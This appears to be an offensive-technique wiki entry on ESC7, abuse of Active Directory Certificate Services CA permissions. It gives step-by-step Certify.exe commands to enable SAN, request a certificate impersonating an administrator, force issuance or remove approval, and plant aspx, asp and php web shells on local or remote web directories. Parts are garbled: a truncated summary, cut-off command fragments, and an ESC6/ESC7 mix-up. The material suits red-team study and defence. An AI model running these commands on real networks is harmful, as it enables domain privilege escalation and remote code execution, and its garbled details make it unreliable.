---
id: b785c8f2-6423-4f07-aecf-519b5194500a
name: Vulnerable Certificate Authority Access Control
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:05.945258+00:00'
updated_at: '2023-04-10T20:26:13.465949+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]'
sub_techniques:
- '[[Bypass User Account Control|T1548.002 - Bypass User Account Control]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Active Directory Certificate Services]]'
- '[[ESC7 - Vulnerable Certificate Authority Access Control]]'
commands:
- '[[Disable Certificate]]'
- '[[Enable Subject Alternative Name (SAN) in Certify.exe]]'
- '[[Get current CDP list]]'
- '[[Grant Certificate]]'
- '[[Request User Certificate]]'
- '[[Vulnerability check]]'
- '[[Write aspx shell to local web directory]]'
- '[[Write default asp shell to local web directory]]'
- '[[Write php shell to remote web directory]]'
---

# Vulnerable Certificate Authority Access Control

## Summary

Vulnerable Certificate Authority Access Control is a technique used by attackers to gain elevated privileges and bypass security controls within an organization's Active Directory Certificate Services (AD CS) infrastructure. By exploiting vulnerabilities in the access control mechanisms of vulnerab

## Description

# Description

Vulnerable Certificate Authority Access Control is a technique used by attackers to gain elevated privileges and bypass security controls within an organization's Active Directory Certificate Services (AD CS) infrastructure. By exploiting vulnerabilities in the access control mechanisms of vulnerable Certificate Authorities (CAs), attackers can generate fraudulent certificates and gain access to sensitive information or systems. This technique is commonly used in advanced persistent threat (APT) attacks and can be difficult to detect.

Technical Explanation: Attackers can exploit vulnerabilities in the access control mechanisms of vulnerable CAs to create fraudulent certificates that can be used to gain access to sensitive systems or information. This can be accomplished through the use of various commands, such as enabling the SAN extension for all templates under a vulnerable CA, requesting a certificate with a SAN, and retrieving CDP lists and writing shells. Once the attacker has a fraudulent certificate, they can use it to bypass security controls and gain elevated privileges within the organization.

Business Value: This technique can be used to gain access to sensitive information or systems within an organization, allowing attackers to steal intellectual property, financial information, or other valuable assets. It can also be used to establish persistent access to the organization's network, which can be used for further attacks or data exfiltration.

 

## Requirements

1. Access to a vulnerable Certificate Authority

1. Authentication credentials with sufficient privileges

1. Ability to execute commands on the target system

 

## Defense

1. Implement access controls and regular vulnerability scans on AD CS infrastructure

1. Monitor for suspicious activity, such as abnormal certificate requests or CDP list retrievals

1. Implement certificate revocation and renewal processes to quickly respond to compromised certificates

 

## Objectives

1. Gain elevated privileges within the organization's AD CS infrastructure

1. Bypass security controls and gain access to sensitive information or systems

1. Establish persistent access to the organization's network

 

# Instructions

1. Use Certify.exe to scan for vulnerable certificate authorities.

 



**Code**: [[Certify.exe find /vulnerable]]



> This command scans for certificate authorities that allow low privileged users to have the `ManageCA` or `Manage Certificates` permissions. If found, it indicates a potential security vulnerability that should be addressed immediately.



**Command** ([[Vulnerability check]]):

```bash
Certify.exe find /vulnerable
```



2. This command enables the Subject Alternative Name (SAN) extension for all the certificate templates under the vulnerable certification authority (CA) named ESC6. The SAN extension allows a certificate to specify multiple DNS names, IP addresses, or other types of identifiers in a single certificate. This is useful in scenarios where a server or service has multiple names or addresses.

 



**Code**: [[Certify.exe setconfig /enablesan /restart]]



> The Certify.exe tool is used to configure certificate services on a Windows server. The 'setconfig' parameter is used to modify the configuration settings. The '/enablesan' switch is used to enable the SAN extension for all certificate templates. The '/restart' switch is used to restart the certificate services after the configuration changes have been made. This command assumes that the Certify.exe tool is already installed on the server and that the user running the command has the necessary permissions to modify the certificate services configuration.



**Command** ([[Enable Subject Alternative Name (SAN) in Certify.exe]]):

```bash
Certify.exe setconfig /enablesan /restart
```



3. To request a certificate with a Subject Alternative Name (SAN), use the Certify.exe request command followed by the desired template and altname arguments. The template argument specifies the type of certificate being requested, while the altname argument specifies the desired SAN.

 



**Code**: [[Certify.exe request /template:User /altname:super.]]



> The Certify.exe request command is used to request a certificate from a certificate authority. The /template argument specifies the type of certificate being requested, such as User, Web Server, or Code Signing. The /altname argument specifies the desired Subject Alternative Name (SAN) for the certificate. The SAN is used to specify additional domain names or IP addresses that the certificate should be valid for, in addition to the primary domain name specified in the certificate's Common Name (CN) field. This can be useful for securing websites with multiple domain names, or for securing servers with multiple IP addresses. When requesting a certificate with a SAN, be sure to include the desired SAN in the altname argument, separated by commas if multiple SANs are desired.



**Command** ([[Request User Certificate]]):

```bash
Certify.exe request /template:User /altname:super.adm
```



4. To grant approval, run the command 'Certify.exe issue /id:[REQUEST ID]'. To disable the approval requirement, run the command 'Certify.exe setconfig /removeapproval /restart'.

 



**Code**: [[# Grant
Certify.exe issue /id:[REQUEST ID]
# Disab]]



> This command is used to either grant approval for a request or disable the approval requirement altogether. The 'Certify.exe issue' command is used to grant approval for a specific request ID, while the 'Certify.exe setconfig' command is used to remove the approval requirement for all requests. The '/restart' argument is used to restart the Certify service after the change has been made. Please note that granting approval for a request requires appropriate permissions.



**Command** ([[Grant Certificate]]):

```bash
Certify.exe issue /id:[REQUEST ID]
```





**Command** ([[Disable Certificate]]):

```bash
Certify.exe setconfig /removeapproval /restart
```



5. To get the current CDP list, use the following command: 

Certify.exe writefile /ca:SERVER\ca-name /readonly

To write an aspx shell to a local web directory, use the following command: 

Certify.exe writefile /ca:SERVER\ca-name /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx /input:C:\Local\Path\shell.aspx

To write the default asp shell to a local web directory, use the following command: 

Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp

To write a php shell to a remote web directory, use the following command: 

Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /input:C:\Local\path\shell.php

 



**Code**: [[# Get the current CDP list. Useful to find remote ]]



> These commands are used for retrieving the current CDP list and writing shells to local or remote web directories. The `Certify.exe` utility is used for these operations. The `/ca` option specifies the server and the CA name. The `/readonly` option is used to retrieve the current CDP list. The `/path` option is used to specify the path of the shell file and the `/input` option is used to specify the path of the local shell file which needs to be written to the remote web directory. These commands can be used for alternative exploitation from ManageCA to RCE on ADCS server.



**Command** ([[Get current CDP list]]):

```bash
Certify.exe writefile /ca:SERVER\ca-name /readonly
```





**Command** ([[Write aspx shell to local web directory]]):

```bash
Certify.exe writefile /ca:SERVER\ca-name /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx /input:C:\Local\Path\shell.aspx
```





**Command** ([[Write default asp shell to local web directory]]):

```bash
Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp
```





**Command** ([[Write php shell to remote web directory]]):

```bash
Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /input:C:\Local\path\shell.php
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]

### Sub-Techniques

- [[Bypass User Account Control|T1548.002 - Bypass User Account Control]]

## Commands Used

- [[Disable Certificate]]
- [[Enable Subject Alternative Name (SAN) in Certify.exe]]
- [[Get current CDP list]]
- [[Grant Certificate]]
- [[Request User Certificate]]
- [[Vulnerability check]]
- [[Write aspx shell to local web directory]]
- [[Write default asp shell to local web directory]]
- [[Write php shell to remote web directory]]

## Tags

- [[Active Directory Attacks]]
- [[Active Directory Certificate Services]]
- [[ESC7 - Vulnerable Certificate Authority Access Control]]


